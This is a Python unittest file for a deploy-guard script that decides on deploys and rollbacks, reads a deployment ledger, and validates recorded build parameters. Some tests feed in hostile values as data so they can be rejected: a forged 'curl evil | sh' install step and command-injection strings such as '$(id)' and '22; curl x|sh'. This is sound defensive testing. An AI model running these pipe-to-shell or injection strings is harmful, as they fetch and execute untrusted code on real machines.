# scripts/test_deploy_guard.py
import contextlib
import io
import json
import subprocess
import types
import unittest
from unittest import mock

import deploy_guard
from deploy_guard import decide, deployment_request, freezes_to_close, pick_live, pick_previous, recorded_build

A, B, C = "a" * 40, "b" * 40, "c" * 40
BUILD_A = {"kind": "pages", "node": "20", "install": "npm ci", "build": "npm run build", "out_dir": "dist", "cf_project": "site"}
BUILD_B = {**BUILD_A, "node": "22", "out_dir": "build"}


def ctx(**kw):
    c = {"sha": B, "reason": "deploy", "env": "production", "on_main": True, "ci": "success",
         "live_sha": A, "newer_than_live": True, "ledger_success_shas": [A], "freezes": [],
         "pr": 12, "pr_labels": [], "now": "2026-10-01T00:00:00Z", "has_drill_alias": True,
         "current_build": BUILD_B, "live_build": BUILD_A, "target_build": BUILD_A}
    c.update(kw)
    return c


class Decide(unittest.TestCase):
    def test_happy_deploy_goes_with_live_as_rollback_target(self):
        d = decide(ctx())
        self.assertTrue(d["go"])
        self.assertEqual((d["prev_sha"], d["from_sha"]), (A, A))

    def test_deploy_requires_green_ci(self):
        for state in ("failure", "missing", "in_progress"):
            with self.subTest(state=state):
                d = decide(ctx(ci=state))
                self.assertFalse(d["go"])
                self.assertIn(f"ci is {state}", d["message"])

    def test_unmerged_sha_refused(self):
        self.assertFalse(decide(ctx(on_main=False))["go"])
        self.assertFalse(decide(ctx(on_main=False, reason="rollback"))["go"])

    def test_already_live_is_skipped_for_deploy(self):
        self.assertIn("already live", decide(ctx(sha=A))["message"])

    def test_out_of_order_older_sha_is_skipped(self):
        d = decide(ctx(newer_than_live=False))
        self.assertFalse(d["go"])
        self.assertIn("out of order", d["message"])

    def test_freeze_blocks_deploy_unless_hotfix(self):
        self.assertIn("#42", decide(ctx(freezes=[42]))["message"])
        self.assertFalse(decide(ctx(freezes=[42]))["go"])
        self.assertTrue(decide(ctx(freezes=[42], pr_labels=["hotfix"]))["go"])

    def test_first_deploy_has_no_rollback_target(self):
        d = decide(ctx(live_sha="", ledger_success_shas=[]))
        self.assertTrue(d["go"])
        self.assertEqual(d["prev_sha"], "")
        self.assertIn("first v4 deploy", d["message"])

    def test_rollback_to_pre_ci_commit_allowed_when_on_ledger(self):
        self.assertTrue(decide(ctx(reason="rollback", sha=C, ci="missing", ledger_success_shas=[A, C]))["go"])

    def test_rollback_refused_without_ci_or_ledger(self):
        self.assertFalse(decide(ctx(reason="rollback", sha=C, ci="missing"))["go"])

    def test_rollback_to_live_is_a_noop_redeploy(self):
        d = decide(ctx(reason="rollback", sha=A))
        self.assertTrue(d["go"])
        self.assertIn("no-op", d["message"])

    def test_rollback_ignores_freeze_and_age(self):
        self.assertTrue(decide(ctx(reason="rollback", freezes=[42], newer_than_live=False))["go"])

    def test_force_smoke_fail_refused_on_production(self):
        self.assertFalse(decide(ctx(force_smoke_fail=True))["go"])
        self.assertTrue(decide(ctx(force_smoke_fail=True, env="drill"))["go"])

    def test_drill_needs_a_preview_alias(self):
        self.assertFalse(decide(ctx(env="drill", has_drill_alias=False))["go"])


class Ledger(unittest.TestCase):
    def dep(self, sha, state, payload=None):
        return {"sha": sha, "state": state, "created_at": "", "payload": payload or {}}

    def test_pick_live_ignores_failures(self):
        self.assertEqual(pick_live([self.dep(B, "failure"), self.dep(A, "success")]), A)

    def test_pick_previous_skips_live_and_rolled_back_shas(self):
        deps = [self.dep(A, "success", {"rolled_back_from": B}), self.dep(B, "success"), self.dep(C, "success")]
        self.assertEqual((pick_live(deps), pick_previous(deps)), (A, C))

    def test_deployment_request_never_auto_merges_or_waits_on_contexts(self):
        r = deployment_request(A, "production-worker", "deploy", "https://run")
        self.assertIs(r["auto_merge"], False)
        self.assertEqual(r["required_contexts"], [])
        self.assertTrue(r["production_environment"])
        self.assertTrue(deployment_request(A, "drill", "deploy", "")["transient_environment"])

    def test_freezes_to_close_ignores_freezes_newer_than_the_decision(self):
        fz = [{"number": 1, "created_at": "2026-10-01T00:00:00Z"}, {"number": 2, "created_at": "2026-10-01T00:05:00Z"}]
        self.assertEqual(freezes_to_close(fz, "2026-10-01T00:01:00Z"), [1])

    def test_freeze_opened_after_the_decision_survives(self):
        fz = [{"number": 1, "created_at": "2026-10-01T00:00:00Z"}, {"number": 2, "created_at": "2026-10-01T00:00:30Z"}]
        self.assertEqual(freezes_to_close(fz, "2026-10-01T00:00:10Z"), [1])

    def test_freeze_created_in_the_same_second_as_the_decision_survives(self):
        fz = [{"number": 1, "created_at": "2026-10-01T00:01:00Z"}]
        self.assertEqual(freezes_to_close(fz, "2026-10-01T00:01:00Z"), [])


class RecordedBuild(unittest.TestCase):
    """Rollback rebuilds the target with the params it deployed with, never the failed deploy's."""

    BOT = {"login": "github-actions[bot]", "type": "Bot"}

    def dep(self, sha, state, payload=None, creator=None):
        return {"sha": sha, "state": state, "created_at": "", "payload": payload or {}, "creator": self.BOT if creator is None else creator}

    def test_deployment_request_carries_the_build_params(self):
        r = deployment_request(A, "production", "deploy", "https://run", build=BUILD_A)
        self.assertEqual(r["payload"]["build"], BUILD_A)
        self.assertNotIn("build", deployment_request(A, "production", "deploy", "https://run")["payload"])

    def test_recorded_build_reads_the_newest_success_of_that_sha(self):
        deps = [self.dep(B, "success", {"build": BUILD_B}), self.dep(A, "failure", {"build": BUILD_B}),
                self.dep(A, "success", {"build": BUILD_A})]
        self.assertEqual(recorded_build(deps, A), BUILD_A)
        self.assertEqual(recorded_build(deps, B), BUILD_B)

    def test_no_record_or_incomplete_record_means_none(self):
        self.assertIsNone(recorded_build([self.dep(A, "success")], A))  # deployed before params were recorded
        self.assertIsNone(recorded_build([self.dep(A, "failure", {"build": BUILD_A})], A))
        self.assertIsNone(recorded_build([self.dep(A, "success", {"build": {"node": "20"}})], A))
        self.assertIsNone(recorded_build([self.dep(A, "success", {"build": "npm ci"})], A))
        self.assertIsNone(recorded_build([], A))

    def test_decide_hands_the_targets_params_to_the_rollback(self):
        d = decide(ctx(live_build=BUILD_A))
        self.assertEqual(json.loads(d["prev_build"]), BUILD_A)
        self.assertNotIn("\n", d["prev_build"])  # one line: it goes through $GITHUB_OUTPUT

    def test_decide_without_recorded_params_says_so(self):
        self.assertEqual(decide(ctx(live_build=None))["prev_build"], "")
        self.assertEqual(decide(ctx(ci="failure", live_build=BUILD_A))["prev_build"], "")

    def test_gather_looks_up_the_live_shas_params(self):
        fakes = {
            "gh": lambda *a, **k: "f" * 40, "now": lambda: "2026-10-01T00:00:00Z",
            "ledger": lambda *a: [self.dep(A, "success", {"build": BUILD_A})],
            "pr_of": lambda *a: (None, []), "ancestor_or_equal": lambda *a: True,
            "ci_state": lambda *a: "success", "open_freezes": lambda *a: [],
        }
        with contextlib.ExitStack() as st:
            for k, v in fakes.items():
                st.enter_context(mock.patch.object(deploy_guard, k, v))
            c = deploy_guard.gather("o/r", "f" * 40, "deploy", "production", False, True)
        self.assertEqual(c["live_sha"], A)
        self.assertEqual(c["live_build"], BUILD_A)

    def test_record_stores_the_params_in_the_deployment_payload(self):
        posted = []

        def fake_gh(*args, stdin=None):
            posted.append((args, stdin))
            return json.dumps({"id": 5})

        a = types.SimpleNamespace(repo="BJGLLC/r", sha=B, env="production", reason="deploy", url="https://x",
                                  run_url="https://run", state="success", from_sha=A, build_json=json.dumps(BUILD_B))
        with mock.patch.object(deploy_guard, "gh", fake_gh):
            deploy_guard.record(a)
        payload = json.loads(posted[0][1])["payload"]
        self.assertEqual(payload["build"], BUILD_B)
        self.assertEqual(payload["rolled_back_from"], A)

    def test_record_without_params_writes_none(self):
        posted = []
        a = types.SimpleNamespace(repo="BJGLLC/r", sha=B, env="production", reason="deploy", url="",
                                  run_url="", state="failure", from_sha="", build_json="")
        with mock.patch.object(deploy_guard, "gh", lambda *x, stdin=None: posted.append(stdin) or json.dumps({"id": 1})):
            deploy_guard.record(a)
        self.assertNotIn("build", json.loads(posted[0])["payload"])

    def test_record_cli_rejects_malformed_params(self):
        for bad in ("not json", "[]", json.dumps({"node": "20"})):
            with self.subTest(bad=bad), contextlib.redirect_stderr(io.StringIO()), \
                    mock.patch.object(deploy_guard, "gh", side_effect=AssertionError("validation must run before any gh call")), \
                    self.assertRaises(SystemExit):
                deploy_guard.main(["record", "--repo", "o/r", "--sha", B, "--env", "production", "--reason", "deploy",
                                   "--url", "", "--run-url", "", "--state", "success", "--build-json", bad])

    # --- fix round 1: trust, destination pinning, shape checks, the manual rollback path ---
    def test_records_by_anyone_but_the_gates_bot_are_not_trusted(self):
        forged = {"build": {**BUILD_A, "install": "curl evil | sh"}}
        for who in ({"login": "mallory", "type": "User"}, {"login": "github-actions[bot]", "type": "User"},
                    {"login": "cloudflare-pages[bot]", "type": "Bot"}, {}, None):
            with self.subTest(who=who):
                self.assertIsNone(recorded_build([self.dep(A, "success", forged, who or {})], A))
                d = decide(ctx(live_build=recorded_build([self.dep(A, "success", forged, who or {})], A)))
                self.assertEqual(d["prev_build"], "")

    def test_a_forged_newer_record_does_not_shadow_the_trusted_one(self):
        deps = [self.dep(A, "success", {"build": {**BUILD_A, "install": "evil"}}, {"login": "mallory", "type": "User"}),
                self.dep(A, "success", {"build": BUILD_A})]
        self.assertEqual(recorded_build(deps, A), BUILD_A)

    def test_ledger_reads_the_creator_and_tolerates_odd_payloads(self):
        def fake(path):
            if "/statuses" in path:
                return [{"state": "success"}]
            return [{"id": 1, "sha": A, "created_at": "t", "payload": "[1]", "creator": {"login": "github-actions[bot]", "type": "Bot"}},
                    {"id": 2, "sha": B, "created_at": "t", "payload": "not json", "creator": None},
                    {"id": 3, "sha": C, "created_at": "t", "payload": ["x"]},
                    {"id": 4, "sha": C, "created_at": "t", "payload": json.dumps({"build": BUILD_A}),
                     "creator": {"login": "github-actions[bot]", "type": "Bot"}}]
        with mock.patch.object(deploy_guard, "gh_json", fake):
            deps = deploy_guard.ledger("o/r", "production")
        self.assertEqual([d["payload"] for d in deps[:3]], [{}, {}, {}])
        self.assertEqual(deps[0]["creator"], self.BOT)
        self.assertEqual(recorded_build(deps, C), BUILD_A)
        self.assertEqual(decide(ctx(live_sha=A, live_build=recorded_build(deps, A)))["prev_build"], "")  # no crash

    def test_ledger_can_query_one_sha(self):
        seen = []
        with mock.patch.object(deploy_guard, "gh_json", lambda p: seen.append(p) or []):
            deploy_guard.ledger("o/r", "production", 20, A)
        self.assertIn(f"sha={A}", seen[0])

    def test_a_different_kind_or_project_disarms_the_rollback(self):
        for k, v in (("kind", "worker"), ("cf_project", "other-clients-project")):
            with self.subTest(k=k):
                d = decide(ctx(live_build={**BUILD_A, k: v}, current_build=BUILD_A))
                self.assertEqual((d["go"], d["prev_build"]), (True, ""))
                self.assertIn("different " + k, d["warning"])
                r = decide(ctx(reason="rollback", target_build={**BUILD_A, k: v}, current_build=BUILD_A))
                self.assertFalse(r["go"])
                self.assertEqual(r["ship_build"], "")

    def test_node_and_out_dir_shapes_are_checked(self):
        for k, v in (("node", "22; curl x|sh"), ("node", ""), ("node", "$(id)"), ("out_dir", "/etc"), ("out_dir", "../x"),
                     ("out_dir", "a/../../x"), ("out_dir", "a b"), ("out_dir", "dist\n"), ("out_dir", "$HOME"), ("kind", "lambda")):
            with self.subTest(k=k, v=v):
                self.assertNotEqual(deploy_guard.build_problem({**BUILD_A, k: v}, BUILD_A), "")
        for k, v in (("node", "22"), ("node", "20.11.1"), ("node", "20.x"), ("node", "lts/*"), ("node", "lts/iron"),
                     ("out_dir", ""), ("out_dir", "dist"), ("out_dir", "apps/web/.output/public"), ("out_dir", ".")):
            with self.subTest(ok=(k, v)):
                self.assertEqual(deploy_guard.build_problem({**BUILD_A, k: v}, BUILD_A), "")

    def test_auto_rollback_target_without_params_is_not_announced(self):
        d = decide(ctx(live_build=None))
        self.assertTrue(d["go"])
        self.assertEqual((d["prev_sha"], d["prev_build"]), (A, ""))
        self.assertNotIn("auto-rollback target", d["message"])
        self.assertIn("DISARMED", d["message"])
        self.assertIn("auto-rollback disarmed", d["warning"])
        self.assertIn("auto-rollback target", decide(ctx())["message"])

    def test_normal_deploys_ship_the_current_inputs(self):
        d = decide(ctx(current_build=BUILD_B, live_build=BUILD_A))
        self.assertEqual(json.loads(d["ship_build"]), BUILD_B)
        self.assertEqual(json.loads(d["prev_build"]), BUILD_A)

    def test_manual_rollback_ships_the_targets_recorded_params_not_current_inputs(self):
        d = decide(ctx(reason="rollback", sha=A, live_sha=B, current_build=BUILD_A, target_build=BUILD_A))
        self.assertTrue(d["go"])
        self.assertEqual(json.loads(d["ship_build"]), BUILD_A)
        # the failed change moved node/out_dir; the caller's current inputs differ but the target's win
        newer = {**BUILD_A, "node": "18", "out_dir": "public"}
        d = decide(ctx(reason="rollback", sha=A, live_sha=B, current_build=BUILD_B, target_build=newer))
        self.assertEqual(json.loads(d["ship_build"]), newer)

    def test_manual_rollback_without_a_record_refuses_loudly(self):
        d = decide(ctx(reason="rollback", target_build=None))
        self.assertFalse(d["go"])
        self.assertEqual(d["ship_build"], "")
        self.assertTrue(d["message"].startswith("refused: no recorded build params for bbbbbbb; manual rollback needed"))

    def test_callers_without_build_params_keep_the_old_behaviour(self):
        # eos-deploy calls decide with no --current-build and records no params
        r = decide(ctx(reason="rollback", current_build=None, target_build=None, live_build=None))
        self.assertTrue(r["go"])
        self.assertEqual((r["ship_build"], r["warning"]), ("", ""))
        d = decide(ctx(current_build=None, live_build=None))
        self.assertEqual((d["go"], d["prev_sha"], d["prev_build"], d["warning"]), (True, A, "", ""))
        self.assertIn("auto-rollback target", d["message"])
        self.assertNotIn("DISARMED", d["message"])
        self.assertIn("no rollback target", decide(ctx(current_build=None, live_sha=""))["message"])

    # --- fix round 4: no seeding; only the target's own trusted record ships a manual rollback ---
    def assertRefusesNoRecord(self, d, s7="aaaaaaa"):
        self.assertFalse(d["go"])
        self.assertEqual((d["ship_build"], d["warning"]), ("", ""))
        self.assertEqual(d["message"], f"refused: no recorded build params for {s7}; manual rollback needed — "
                                       "see `bin/rollback <name> --revert`")

    def test_a_live_sha_rollback_with_no_record_refuses_never_seeds(self):
        # re-shipping the live (older) SHA with main's current inputs is the P1's shape again
        self.assertRefusesNoRecord(decide(ctx(reason="rollback", sha=A, live_sha=A, target_build=None, current_build=BUILD_B)))

    def test_manual_rollback_needs_the_targets_own_trusted_record(self):
        # not live -> refuse; a trusted-but-mismatched record on the live sha -> refuse
        self.assertRefusesNoRecord(decide(ctx(reason="rollback", sha=B, live_sha=A, target_build=None)), "bbbbbbb")
        mism = decide(ctx(reason="rollback", sha=A, live_sha=A, target_build={**BUILD_B, "cf_project": "other"}))
        self.assertFalse(mism["go"])
        self.assertEqual(mism["ship_build"], "")
        self.assertIn("different cf_project", mism["message"])
        # a live sha WITH a trusted record ships that record, not the current inputs
        rec = decide(ctx(reason="rollback", sha=A, live_sha=A, target_build=BUILD_A, current_build=BUILD_B))
        self.assertEqual(json.loads(rec["ship_build"]), BUILD_A)
        self.assertEqual(rec["warning"], "")

    def test_a_forged_live_record_refuses(self):
        forged = self.dep(A, "success", {"build": {**BUILD_A, "install": "evil"}}, {"login": "mallory", "type": "User"})
        tb = recorded_build([forged], A)
        self.assertRefusesNoRecord(decide(ctx(reason="rollback", sha=A, live_sha=A, target_build=tb, current_build=BUILD_B)))

    def _gather(self, deps):
        fakes = {"gh": lambda *a, **k: A, "now": lambda: "t", "ledger": lambda *a: deps, "pr_of": lambda *a: (None, []),
                 "ancestor_or_equal": lambda *a: True, "ci_state": lambda *a: "success", "open_freezes": lambda *a: []}
        with contextlib.ExitStack() as st:
            for k, v in fakes.items():
                st.enter_context(mock.patch.object(deploy_guard, k, v))
            return deploy_guard.gather("o/r", A, "rollback", "production", False, True, BUILD_B)

    def test_failed_smoke_then_rollback_of_the_previous_sha_refuses(self):
        # A was live without params; B deployed, failed smoke (its failure record is newest); B still serves.
        deps = [self.dep(B, "failure", {}), self.dep(A, "success", {})]
        c = self._gather(deps)
        self.assertEqual(c["live_sha"], "")  # CF mode: a record without params is nobody's rollback target
        self.assertNotIn("seedable", c)
        self.assertRefusesNoRecord(decide(c))

    def test_a_clean_live_sha_without_its_own_record_refuses(self):
        # another SHA's trusted record never stands in for the target's
        self.assertRefusesNoRecord(decide(self._gather([self.dep(A, "success", {}), self.dep(C, "success", {"build": BUILD_A})])))

    def test_a_ship_failed_run_then_rollback_of_the_live_sha_refuses(self):
        # B's ship failed -> verify/record never ran, so A's success is still newest, but main HEAD (this run's
        # inputs) is B: re-shipping A with them would pair old code with new inputs.
        self.assertRefusesNoRecord(decide(self._gather([self.dep(A, "success", {})])))
        for deps in ([], [self.dep(A, "pending", {})]):
            with self.subTest(deps=deps):
                self.assertRefusesNoRecord(decide(self._gather(deps)))

    def test_an_empty_current_build_is_an_error_not_eos_mode(self):
        for val in ("", "{}", "null"):
            with self.subTest(val=val), contextlib.redirect_stderr(io.StringIO()), \
                    mock.patch.object(deploy_guard, "gather", side_effect=AssertionError("must fail before gather")), \
                    self.assertRaises(SystemExit):
                deploy_guard.main(["decide", "--repo", "o/r", "--sha", B, "--reason", "deploy", "--env", "production",
                                   "--current-build", val])

    def test_an_absent_current_build_is_eos_mode(self):
        seen = []
        with mock.patch.object(deploy_guard, "gather", lambda *a: seen.append(a) or ctx(current_build=None, live_build=None)), \
                contextlib.redirect_stdout(io.StringIO()):
            deploy_guard.main(["decide", "--repo", "o/r", "--sha", B, "--reason", "deploy", "--env", "production"])
        self.assertIsNone(seen[0][6])  # gather's current_build

    def test_node_specs_with_dot_dot_are_rejected(self):
        for v in ("..", "20..1", "lts/../x", "../20"):
            with self.subTest(v=v):
                self.assertNotEqual(deploy_guard.build_problem({**BUILD_A, "node": v}, BUILD_A), "")

    def test_setup_node_version_specs(self):
        ok = ("20", "20.x", "20.11.1", "lts/*", "lts/iron", ">=20", "^20", "~20.1", "node", "latest", ">=20 <23", "22")
        bad = ("", "22; curl x|sh", "$(id)", "`id`", "20\nfoo", "20\n", "a" * 33, " 20", "20'", '20"', "20&&id", "20 | sh", "{20}")
        for v in ok:
            with self.subTest(ok=v):
                self.assertEqual(deploy_guard.build_problem({**BUILD_A, "node": v}, BUILD_A), "")
        for v in bad:
            with self.subTest(bad=v):
                self.assertNotEqual(deploy_guard.build_problem({**BUILD_A, "node": v}, BUILD_A), "")

    def test_gather_looks_up_the_rollback_targets_own_records(self):
        calls = []

        def fake_ledger(repo, env, n=20, sha=""):
            calls.append(sha)
            return [self.dep(A, "success", {"build": BUILD_A})] if sha in ("", A) else []
        fakes = {"gh": lambda *a, **k: A, "now": lambda: "t", "ledger": fake_ledger, "pr_of": lambda *a: (None, []),
                 "ancestor_or_equal": lambda *a: True, "ci_state": lambda *a: "success", "open_freezes": lambda *a: []}
        with contextlib.ExitStack() as st:
            for k, v in fakes.items():
                st.enter_context(mock.patch.object(deploy_guard, k, v))
            c = deploy_guard.gather("o/r", A, "rollback", "production", False, True, BUILD_B)
        self.assertEqual(c["target_build"], BUILD_A)
        self.assertEqual(c["current_build"], BUILD_B)
        self.assertIn(A, calls)

    def test_decide_cli_takes_the_current_build(self):
        out = io.StringIO()
        with mock.patch.object(deploy_guard, "gather", lambda *a: ctx()), contextlib.redirect_stdout(out):
            deploy_guard.main(["decide", "--repo", "o/r", "--sha", B, "--reason", "deploy", "--env", "production",
                               "--current-build", json.dumps(BUILD_B)])
        self.assertEqual(json.loads(json.loads(out.getvalue())["ship_build"]), BUILD_B)

    def test_freeze_text_is_truthful_when_nothing_was_rolled_back(self):
        made = []

        def fake_gh(*args, stdin=None):
            made.append(args)
            return "https://github.com/BJGLLC/r/issues/9"
        a = types.SimpleNamespace(repo="BJGLLC/r", env="production", frm=B, to=A, run_url="https://run", state="smoke-failed-no-target")
        with mock.patch.object(deploy_guard, "gh", fake_gh):
            deploy_guard.freeze_open(a)
        issue = next(c for c in made if c[:2] == ("issue", "create"))
        title, body = issue[issue.index("--title") + 1], issue[issue.index("--body") + 1]
        self.assertIn("[production]", title)
        self.assertNotIn("rolled back from", title)
        self.assertIn("NOT rolled back", body)
        self.assertIn("still live", body)


class FreezeOpen(unittest.TestCase):
    def test_creates_a_new_issue_even_when_a_freeze_is_already_open(self):
        calls = []

        def fake_gh(*args, stdin=None):
            calls.append(args)
            if args[0] == "api":
                return json.dumps([{"number": 7, "created_at": "2026-10-01T00:00:00Z", "title": "deploy-freeze [production]: x"}])
            if args[:2] == ("issue", "create"):
                return "https://github.com/BJGLLC/r/issues/8"
            return ""

        a = types.SimpleNamespace(repo="BJGLLC/r", env="production", frm=A, to=B, run_url="https://run")
        with mock.patch.object(deploy_guard, "gh", fake_gh):
            self.assertEqual(deploy_guard.freeze_open(a), 8)
        self.assertTrue(any(c[:2] == ("issue", "create") for c in calls))
        self.assertFalse(any(c[:2] == ("issue", "comment") for c in calls))


class Gather(unittest.TestCase):
    def test_decision_time_is_taken_before_the_freezes_are_read(self):
        order = []
        fakes = {
            "gh": lambda *a, **k: order.append("gh") or "f" * 40,
            "now": lambda: order.append("now") or "2026-10-01T00:00:00Z",
            "ledger": lambda *a: order.append("ledger") or [],
            "pr_of": lambda *a: order.append("pr_of") or (None, []),
            "ancestor_or_equal": lambda *a: order.append("ancestor") or True,
            "ci_state": lambda *a: order.append("ci") or "success",
            "open_freezes": lambda *a: order.append("open_freezes") or [],
        }
        with contextlib.ExitStack() as st:
            for k, v in fakes.items():
                st.enter_context(mock.patch.object(deploy_guard, k, v))
            deploy_guard.gather("o/r", "f" * 40, "deploy", "production", False, True)
        self.assertLess(order.index("now"), order.index("open_freezes"))

    def test_gh_failure_prints_stderr_and_reraises(self):
        err = subprocess.CalledProcessError(1, ["gh"], output="", stderr="HTTP 403: nope")
        with mock.patch.object(deploy_guard.subprocess, "run", side_effect=err), \
                contextlib.redirect_stderr(io.StringIO()) as se, self.assertRaises(subprocess.CalledProcessError):
            deploy_guard.gh("api", "x")
        self.assertIn("HTTP 403: nope", se.getvalue())


BOT = {"login": "github-actions[bot]", "type": "Bot"}
MALLORY = {"login": "mallory", "type": "User"}


def rec(sha, state, payload=None, creator=BOT):
    return {"sha": sha, "state": state, "created_at": "", "payload": payload or {}, "creator": creator}


def gather_with(deps, sha=B, reason="deploy", env="production", current_build=BUILD_B, files=None, drill=(), extra=()):
    """gather() over a fake ledger. `files`: what the compare API lists for live...sha. `extra`: gather's
    positional args after current_build (build_paths, client, ping_configured)."""
    calls = []

    def fake_ledger(repo, e, n=20, s=""):
        calls.append(("ledger", e, s))
        if e == "drill":
            return list(drill)
        return [d for d in deps if not s or d["sha"] == s]

    def fake_gh_json(path):
        calls.append(("gh_json", path))
        if "/compare/" in path:
            return {"status": "ahead", "files": files or []}
        raise AssertionError(path)
    fakes = {"gh": lambda *a, **k: sha, "now": lambda: "t", "ledger": fake_ledger, "gh_json": fake_gh_json,
             "pr_of": lambda *a: (None, []), "ancestor_or_equal": lambda *a: True, "ci_state": lambda *a: "success",
             "open_freezes": lambda *a: []}
    with contextlib.ExitStack() as st:
        for k, v in fakes.items():
            st.enter_context(mock.patch.object(deploy_guard, k, v))
        c = deploy_guard.gather("o/r", sha, reason, env, False, True, current_build, *extra)
    return c, calls


class TrustedLedger(unittest.TestCase):
    """The CF pipeline's live/previous are the newest records it can actually roll back to (SSSF-31 carry)."""

    def test_trusted_live_skips_records_nobody_can_roll_back_to(self):
        deps = [rec(C, "success", {"build": BUILD_A}, MALLORY), rec(B, "success", {}), rec(A, "success", {"build": BUILD_A})]
        self.assertEqual(pick_live(deps), C)  # eos mode: unchanged, the newest success
        self.assertEqual(pick_live(deps, trusted_only=True), A)

    def test_trusted_previous_returns_only_rollable_shas(self):
        deps = [rec(A, "success", {"build": BUILD_A}), rec(C, "success", {"build": BUILD_A}, MALLORY),
                rec(B, "success", {"build": BUILD_B})]
        self.assertEqual(pick_previous(deps), C)
        self.assertEqual(pick_previous(deps, trusted_only=True), B)
        self.assertEqual(pick_previous([rec(A, "success", {"build": BUILD_A}), rec(C, "success", {})], trusted_only=True), "")

    def test_trusted_previous_still_skips_rolled_back_shas(self):
        deps = [rec(A, "success", {"build": BUILD_A, "rolled_back_from": B}), rec(B, "success", {"build": BUILD_B}),
                rec(C, "success", {"build": BUILD_A})]
        self.assertEqual(pick_previous(deps, trusted_only=True), C)

    def test_an_untrusted_newer_record_cannot_disarm_the_auto_rollback(self):
        # A shipped through the pipeline; then someone hand-wrote a success for C. B fails its smoke: with C
        # as "live" the rollback had no params, so B stayed up as smoke-failed-no-target.
        c, _ = gather_with([rec(C, "success", {}, MALLORY), rec(A, "success", {"build": BUILD_A})])
        self.assertEqual(c["live_sha"], A)
        d = decide(c)
        self.assertEqual((d["go"], d["prev_sha"], json.loads(d["prev_build"])), (True, A, BUILD_A))
        self.assertNotIn("DISARMED", d["message"])

    def test_eos_mode_keeps_the_plain_ledger(self):
        c, _ = gather_with([rec(C, "success", {}, MALLORY), rec(A, "success", {"build": BUILD_A})], current_build=None)
        self.assertEqual(c["live_sha"], C)

    def test_live_and_previous_cli_take_trusted(self):
        deps = [rec(C, "success", {}, MALLORY), rec(B, "success", {"build": BUILD_B}), rec(A, "success", {"build": BUILD_A})]
        for argv, want in ((["live"], C), (["live", "--trusted"], B), (["previous"], B), (["previous", "--trusted"], A)):
            with self.subTest(argv=argv), mock.patch.object(deploy_guard, "ledger", lambda *a: deps), \
                    contextlib.redirect_stdout(io.StringIO()) as out:
                deploy_guard.main([argv[0], "--repo", "o/r", "--env", "production", *argv[1:]])
            self.assertEqual(out.getvalue().strip(), want)


class RangeFilter(unittest.TestCase):
    """Build-change-only deploys (decision 01M3N14TGN §3), never while live is unprotected."""

    PATHS = ["site/**", ".github/workflows/deploy.yml", "package*.json"]

    def test_a_build_free_range_is_skipped_when_the_rollback_is_armed(self):
        d = decide(ctx(skippable=True))
        self.assertFalse(d["go"])
        self.assertEqual(d["message"], "skip: aaaaaaa..bbbbbbb changes no build input; live stays aaaaaaa")

    def test_never_skips_while_live_has_no_trusted_record(self):
        # the workflow-only first deploy must ship: its green verify writes the first trusted record
        for kw in (dict(live_build=None), dict(live_sha="", ledger_success_shas=[], live_build=None),
                   dict(live_build={**BUILD_B, "cf_project": "other"})):
            with self.subTest(kw=kw):
                self.assertTrue(decide(ctx(skippable=True, **kw))["go"])

    def test_never_skips_rollbacks_drills_or_eos_targets(self):
        self.assertTrue(decide(ctx(skippable=True, reason="rollback", sha=A))["go"])
        self.assertTrue(decide(ctx(skippable=True, env="drill"))["go"])
        self.assertTrue(decide(ctx(skippable=True, current_build=None, live_build=None))["go"])

    def test_a_hotfix_during_a_freeze_ships_even_if_build_free(self):
        self.assertTrue(decide(ctx(skippable=True, freezes=[42], pr_labels=["hotfix"]))["go"])

    def test_gather_reads_the_range_from_the_compare_api(self):
        deps = [rec(A, "success", {"build": BUILD_A})]
        cases = ((["README.md", "docs/a/b.md"], True), (["site/index.html"], False), (["site/a/b/c.css", "README.md"], False),
                 ([".github/workflows/deploy.yml"], False), (["package-lock.json"], False), ([], True),
                 ([".github/workflows/ci.yml"], True))
        for names, skip in cases:
            with self.subTest(names=names):
                c, calls = gather_with(deps, files=[{"filename": n} for n in names], extra=(self.PATHS,))
                self.assertIs(c["skippable"], skip)
                self.assertIn(("gh_json", f"repos/o/r/compare/{A}...{B}"), calls)

    def test_a_rename_out_of_a_build_path_is_a_build_change(self):
        c, _ = gather_with([rec(A, "success", {"build": BUILD_A})], extra=(self.PATHS,),
                           files=[{"filename": "old/index.html", "previous_filename": "site/index.html"}])
        self.assertFalse(c["skippable"])

    def test_a_truncated_file_list_is_never_skippable(self):
        c, _ = gather_with([rec(A, "success", {"build": BUILD_A})], extra=(self.PATHS,),
                           files=[{"filename": f"docs/{i}.md"} for i in range(300)])
        self.assertFalse(c["skippable"])

    def test_no_compare_call_without_paths_a_live_record_or_for_a_rollback(self):
        live = [rec(A, "success", {"build": BUILD_A})]
        for deps, kw in ((live, dict()), ([], dict(extra=(self.PATHS,))), (live, dict(extra=(self.PATHS,), reason="rollback", sha=A))):
            with self.subTest(deps=deps, kw=kw):
                c, calls = gather_with(deps, **kw)
                self.assertFalse(c["skippable"])
                self.assertFalse([x for x in calls if x[0] == "gh_json"])

    def test_decide_cli_passes_the_build_paths(self):
        seen = []
        with mock.patch.object(deploy_guard, "gather", lambda *a: seen.append(a) or ctx()), \
                contextlib.redirect_stdout(io.StringIO()):
            deploy_guard.main(["decide", "--repo", "o/r", "--sha", B, "--reason", "deploy", "--env", "production",
                               "--current-build", json.dumps(BUILD_B), "--build-paths", "site/**\nREADME.md, x/*"])
        self.assertEqual(seen[0][7], ["site/**", "README.md", "x/*"])


class ClientProduction(unittest.TestCase):
    """Decision 01M46ESRWR (10/5): client deploys ship on green like anything else, plus an extra check."""

    def ok(self, **kw):
        return ctx(client=True, drill_green=True, ping_configured=True, **kw)

    def test_happy_client_deploy_goes_armed(self):
        d = decide(self.ok())
        self.assertTrue(d["go"])
        self.assertEqual(json.loads(d["prev_build"]), BUILD_A)

    def test_needs_a_green_preview_drill_on_record_first(self):
        d = decide(ctx(client=True, drill_green=False, ping_configured=True))
        self.assertFalse(d["go"])
        self.assertTrue(d["message"].startswith("refused: client production needs a green preview drill on record"))

    def test_needs_the_ping_to_blake_configured(self):
        d = decide(ctx(client=True, drill_green=True, ping_configured=False))
        self.assertFalse(d["go"])
        self.assertIn("MOSHI_TOKEN", d["message"])

    def test_refuses_a_disarmed_auto_rollback(self):
        d = decide(self.ok(live_build={**BUILD_A, "cf_project": "other"}))
        self.assertFalse(d["go"])
        self.assertIn("auto-rollback armed", d["message"])
        self.assertTrue(decide(self.ok(live_sha="", ledger_success_shas=[], live_build=None))["go"])  # first v4 deploy

    def test_skips_stay_skips(self):
        self.assertTrue(decide(ctx(client=True, sha=A))["message"].startswith("skip:"))
